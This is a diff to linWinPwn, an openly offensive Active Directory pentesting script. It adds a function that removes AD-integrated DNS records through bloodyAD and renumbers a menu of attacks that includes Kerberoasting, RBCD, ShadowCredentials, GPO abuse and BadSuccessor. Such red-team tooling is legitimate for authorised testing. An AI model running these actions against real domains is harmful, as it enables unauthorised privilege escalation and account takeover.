@@ -161,7 +161,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.4.3 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.4.4 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -3843,8 +3843,35 @@ dnsentry_add() {
             if [ "${hostname_dnstool}" == "" ]; then hostname_dnstool="kali"; fi
             echo -e "${BLUE}[*] Please confirm the IP of the attacker's machine:${NC}"
             set_attackerIP
-            echo -e "${BLUE}[*] Adding new DNS entry for Active Directory integrated DNS${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord ${hostname_dnstool} ${attacker_IP}" | tee -a "${Modification_dir}//bloodyAD_${user_var}/bloodyad_dns_${dc_domain}.txt"
+            echo -e "${BLUE}[*] Adding new DNS entry ${hostname_dnstool} with IP ${attacker_IP} for Active Directory integrated DNS${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord ${hostname_dnstool} ${attacker_IP}" | tee -a "${Modification_dir}//bloodyAD_${user_var}/bloodyad_dns_add_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
+dnsentry_remove() {
+    if ! stat "${bloodyad}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad${NC}"
+    else
+        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            echo -e "${BLUE}[*] Please specify hostname of the DNS entry to remove (default: kali):${NC}"
+            hostname_dnstool=""
+            read -rp ">> " hostname_dnstool </dev/tty
+            if [ "${hostname_dnstool}" == "" ]; then hostname_dnstool="kali"; fi
+            echo -e "${BLUE}[*] Please specify the IP of the DNS entry to remove:${NC}"
+            dns_remove_IP=""
+            read -rp ">> " dns_remove_IP </dev/tty
+            while [ "${dns_remove_IP}" == "" ]; do
+                echo -e "${RED}Invalid IP.${NC} Please specify the IP of the DNS entry to remove:"
+                read -rp ">> " dns_remove_IP </dev/tty
+            done
+            echo -e "${BLUE}[*] Removing DNS entry ${hostname_dnstool} with IP ${dns_remove_IP} for Active Directory integrated DNS${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} remove dnsRecord ${hostname_dnstool} ${dns_remove_IP}" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_dns_remove_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -6972,26 +6999,27 @@ modif_menu() {
     check_tool_status "${bloodyad}" "Add new computer (Requires: MAQ > 0)" "4"
     check_tool_status "${bloodyad}" "Add new computer to a custom OU location (Requires: MAQ > 0 and GenericWrite on OU)" "4ou"
     check_tool_status "${bloodyad}" "Add new DNS entry (Requires: Modification of DNS)" "5"
-    check_tool_status "${bloodyad}" "Enable account (Requires: GenericWrite)" "6"
-    check_tool_status "${bloodyad}" "Disable account (Requires: GenericWrite)" "7"
-    check_tool_status "${bloodyad}" "Change Owner of target (Requires: WriteOwner permission)" "8"
-    check_tool_status "${bloodyad}" "Add GenericAll rights on target (Requires: Owner of object)" "9"
-    check_tool_status "${bloodyad}" "Delete user or computer (Requires: GenericWrite)" "10"
-    check_tool_status "${bloodyad}" "Restore deleted user or computer (Requires: GenericWrite on OU of deleted object)" "11"
-    check_tool_status "${targetedKerberoast}" "Targeted Kerberoast Attack (Noisy!) (Requires: WriteSPN)" "12"
-    check_tool_status "${bloodyad}" "Perform RBCD attack (Requires: AllowedToAct on computer)" "13"
-    check_tool_status "${bloodyad}" "Perform RBCD attack on SPN-less user (Requires: AllowedToAct on computer & MAQ=0)" "14"
-    check_tool_status "${bloodyad}" "Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)" "15"
-    check_tool_status "${bloodyad}" "Remove added ShadowCredentials (Requires: AddKeyCredentialLink)" "16"
-    check_tool_status "${pygpoabuse}" "Abuse GPO to execute command (Requires: GenericWrite on GPO)" "17"
-    check_tool_status "${bloodyad}" "Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "18"
-    check_tool_status "${bloodyad}" "Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)" "19"
-    check_tool_status "${bloodyad}" "Add userPrincipalName to perform Kerberos impersonation of another user (Targeting Linux machines) (Requires: GenericWrite on user)" "20"
-    check_tool_status "${bloodyad}" "Modify userPrincipalName to perform Certificate impersonation (ESC10) (Requires: GenericWrite on user)" "21"
-    check_tool_status "${bloodyad}" "Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "22"
-    check_tool_status "${bloodyad}" "Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)" "23"
-    check_tool_status "${bloodyad}" "Add dMSA to exploit BadSuccessor on Windows Server 2025 (Requires: GenericWrite on OU)" "24"
-    check_tool_status "${bloodyad}" "Remove dMSA to clean after exploiting BadSuccessor (Requires: GenericWrite on OU)" "25"
+    check_tool_status "${bloodyad}" "Remove DNS entry (Requires: Modification of DNS)" "6"
+    check_tool_status "${bloodyad}" "Enable account (Requires: GenericWrite)" "7"
+    check_tool_status "${bloodyad}" "Disable account (Requires: GenericWrite)" "8"
+    check_tool_status "${bloodyad}" "Change Owner of target (Requires: WriteOwner permission)" "9"
+    check_tool_status "${bloodyad}" "Add GenericAll rights on target (Requires: Owner of object)" "10"
+    check_tool_status "${bloodyad}" "Delete user or computer (Requires: GenericWrite)" "11"
+    check_tool_status "${bloodyad}" "Restore deleted user or computer (Requires: GenericWrite on OU of deleted object)" "12"
+    check_tool_status "${targetedKerberoast}" "Targeted Kerberoast Attack (Noisy!) (Requires: WriteSPN)" "13"
+    check_tool_status "${bloodyad}" "Perform RBCD attack (Requires: AllowedToAct on computer)" "14"
+    check_tool_status "${bloodyad}" "Perform RBCD attack on SPN-less user (Requires: AllowedToAct on computer & MAQ=0)" "15"
+    check_tool_status "${bloodyad}" "Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)" "16"
+    check_tool_status "${bloodyad}" "Remove added ShadowCredentials (Requires: AddKeyCredentialLink)" "17"
+    check_tool_status "${pygpoabuse}" "Abuse GPO to execute command (Requires: GenericWrite on GPO)" "18"
+    check_tool_status "${bloodyad}" "Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "19"
+    check_tool_status "${bloodyad}" "Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)" "20"
+    check_tool_status "${bloodyad}" "Add userPrincipalName to perform Kerberos impersonation of another user (Targeting Linux machines) (Requires: GenericWrite on user)" "21"
+    check_tool_status "${bloodyad}" "Modify userPrincipalName to perform Certificate impersonation (ESC10) (Requires: GenericWrite on user)" "22"
+    check_tool_status "${bloodyad}" "Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "23"
+    check_tool_status "${bloodyad}" "Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)" "24"
+    check_tool_status "${bloodyad}" "Add dMSA to exploit BadSuccessor on Windows Server 2025 (Requires: GenericWrite on OU)" "25"
+    check_tool_status "${bloodyad}" "Remove dMSA to clean after exploiting BadSuccessor (Requires: GenericWrite on OU)" "26"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -7023,107 +7051,112 @@ modif_menu() {
         modif_menu
         ;;
 
-
     5)
         dnsentry_add
         modif_menu
         ;;
 
     6)
-        enable_account
+        dnsentry_remove
         modif_menu
         ;;
 
     7)
-        disable_account
+        enable_account
         modif_menu
         ;;
 
     8)
-        change_owner
+        disable_account
         modif_menu
         ;;
 
     9)
-        add_genericall
+        change_owner
         modif_menu
         ;;
 
     10)
+        add_genericall
+        modif_menu
+        ;;
+
+    11)
         delete_object
         modif_menu
         ;;
 
-    11) restore_account
-        modif_menu
-        ;;
-
     12)
-        targetedkerberoast_attack
+        restore_account
         modif_menu
         ;;
 
     13)
-        rbcd_attack
+        targetedkerberoast_attack
         modif_menu
         ;;
 
     14)
-        rbcd_spnless_attack
+        rbcd_attack
         modif_menu
         ;;
 
     15)
-        shadowcreds_attack
+        rbcd_spnless_attack
         modif_menu
         ;;
 
     16)
-        shadowcreds_delete
+        shadowcreds_attack
         modif_menu
         ;;
 
     17)
-        pygpo_abuse
+        shadowcreds_delete
         modif_menu
         ;;
 
     18)
-        add_unconstrained
+        pygpo_abuse
         modif_menu
         ;;
 
     19)
-        add_spn
+        add_unconstrained
         modif_menu
         ;;
 
     20)
-        add_upn
+        add_spn
         modif_menu
         ;;
 
     21)
-        add_upn_esc10
+        add_upn
         modif_menu
         ;;
 
     22)
-        add_constrained
+        add_upn_esc10
         modif_menu
         ;;
 
     23)
-        add_spn_constrained
+        add_constrained
         modif_menu
         ;;
 
     24)
-        badsuccessor_adddmsa
+        add_spn_constrained
         modif_menu
         ;;
 
     25)
+        badsuccessor_adddmsa
+        modif_menu
+        ;;
+
+    26)
         badsuccessor_deletedmsa
         modif_menu
         ;;
